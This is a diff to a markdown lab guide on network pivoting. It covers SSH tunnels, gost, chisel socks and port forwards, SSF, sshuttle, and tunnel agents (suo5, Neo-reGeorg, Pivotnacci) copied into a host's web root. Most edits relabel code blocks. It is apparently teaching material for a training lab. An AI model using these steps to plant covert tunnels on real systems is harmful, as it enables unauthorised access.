@@ -124,7 +124,7 @@ Then if you realize you need to add more port forwards for the SSH connection in
 
 This requires root access on the client and the server, and the ability to create iptables rules on the server
 
-[This script] from TrustedSec (https://raw.githubusercontent.com/trustedsec/tap/refs/heads/master/scripts/ssh-tunnel.sh) used to work, but we are going to do it manually because it is a little broken for modern Linux systems.
+[This script](https://raw.githubusercontent.com/trustedsec/tap/refs/heads/master/scripts/ssh-tunnel.sh) from TrustedSec used to be able to do this for you, but we are going to do it manually because the script uses deprecated Linux commands that you won't likely find on modern Linux systems.
 
 #### Prepare server
 
@@ -473,7 +473,6 @@ exit
 
 ## gost
 
-https://gost.run/en/tutorials/
 
 Gost is probably the easiest way to just throw up a binary and have it start doing socks proxying, but it is also like socat in the amount of strange combinations of things that it can do. Let's just do a smattering of the possibilities.
 
@@ -571,7 +570,7 @@ ssh root@tom 'pkill gost'
 #### Build and push your binaries
 
 ```
-[[ Chisel~Compiling ]]
+[[ Chisel~Compiling ]]*
 cd tools/chisel
 go mod vendor
 go build -ldflags "-s -w"
@@ -584,7 +583,7 @@ ssh root@tom chmod +x ./chisel
 #### Socks
 
 ```
-[[ Chisel~Socks ]]
+[[ Chisel~Socks ]]*
 ssh root@tom chmod +x ./chisel
 ssh root@tom ss -punta
 	#Do we already see a webserver here?  We can have chisel pretend to be this webserver with the `--backend` flag
@@ -593,7 +592,7 @@ ssh root@tom ss -punta | grep 80
 ```
 
 ```
-[[ Chisel~Callback ]]
+[[ Chisel~Callback ]]*
 curl tom
 curl tom:8080
 	#The pages look the same right?  That is the --backend flag doing what it does.  If you have root access on the machine, it would be even better to move the legit webserver to only listen on loopback, and then have chisel listen on the public-facing interface.
@@ -619,7 +618,7 @@ cat /tmp/PROOF
 #### Local port forward
 
 ```
-[[ Chisel~LocalForward ]]
+[[ Chisel~LocalForward ]]*
 lsof -i tcp:9999
 tools/chisel/chisel client tom:80 9999:linux:80 &
 lsof -i tcp:9999
@@ -637,7 +636,7 @@ cat /tmp/PROOF
 #### Remote port forward
 
 ```
-[[ Chisel~RemoteForward ]]
+[[ Chisel~RemoteForward ]]*
 ssh root@tom ss -punta | grep 8888
 	#check to see if the port is open
 tools/chisel/chisel client tom:80 R:8888:127.0.0.1:4444 &
@@ -664,6 +663,7 @@ ssh root@tom pkill chisel
 ### SSF
 
 ```
+[[ SSF~Prep ]]*
 cd tools/ssf-linux-x86_64-3.0.0
 ```
 
@@ -672,6 +672,7 @@ cd tools/ssf-linux-x86_64-3.0.0
 ##### Create your own certs
 
 ```
+[[ SSF~Prep ]]
 openssl req -newkey rsa:4096 -nodes -keyout private.key -out certificate.csr
 openssl rsa -in private.key -out private.key -aes256 -passout pass:passphrase
 openssl dhparam 4096 -outform PEM -out dh4096.pem
@@ -713,6 +714,7 @@ sed -i "s:./certs/dh4096.pem:$DH:" config.json
 #### push files and execute
 
 ```
+[[ SSF~Action ]]*
 scp ssfd config.json root@10.X.20.220:
 ssh root@10.X.20.220 ./ssfd &
 ./ssf 10.X.20.220 -X 4444 &
@@ -724,8 +726,8 @@ nc 127.0.0.1 4444
 While I think sshuttle is a cool tool, I do not understand all the networking going on under the hood and tools that make changes to my iptables rules makes me uncomfortable.  The benefits of this tool is its simplicity in use, and its small precense on the device to pivot through -- you just need an ssh connection and python on the box.  The major drawback is that if it does not work, it will be painful to troubleshoot.
 
 ```
-[[ sshuttle~connect ]]
-sudo sshuttle --remote root@lamp 10.<YOUR_RANGE_NUMBER>.22.0/24  --daemon
+[[ sshuttle~connect ]]*
+sudo sshuttle --remote root@lamp 10.X.22.0/24  --daemon
 	#The third octet for the target machines is 22, so this will only tunnel traffic meant for the target through the sshuttle tunnel.
 yes
 
@@ -749,14 +751,17 @@ sudo iptables -t nat -nvL
 
 ## suo5
 
+```
+[[ SUO5~Demo ]]*
 cd tools/suo5
 cat suo5.jsp | ssh root@lamp "cat - | sudo tee /usr/share/tomcat/webapps/ROOT/suo5.jsp"
 ./suo5-linux-amd64 -t http://lamp:8080/suo5.jsp
+```
 
 ## Neo-reGeorg
 
 ```
-[[ LOCAL~Test ]] - 2025-04-23 21:05:00 EDT
+[[ NeoreGeorg~Demo ]]*
 cd tools/Neo-reGeorg
 ./neoreg.py generate -k password
 cat neoreg_servers/tunnel.php | ssh -o StrictHostKeyChecking=no root@10.X.20.220 'cat - |sudo tee /var/www/html/tunnel.php'
@@ -767,7 +772,7 @@ cat neoreg_servers/tunnel.php | ssh -o StrictHostKeyChecking=no root@10.X.20.220
 ### Pivotnacci
 
 ```
-[[ Pivotnacci~Tunnel ]]
+[[ Pivotnacci~Demo ]]*
 cd tools/pivotnacci
 cat agents/agent.php | ssh -o StrictHostKeyChecking=no root@10.X.20.220 'cat - |sudo tee /var/www/html/tunnel.php'
 ./pivotnacci http://10.X.20.220/tunnel.php --verbose
@@ -807,3 +812,4 @@ root:PivotLab1!
 - https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/
 - https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/
 - https://latest.gost.run/en/
+- https://gost.run/en/tutorials/
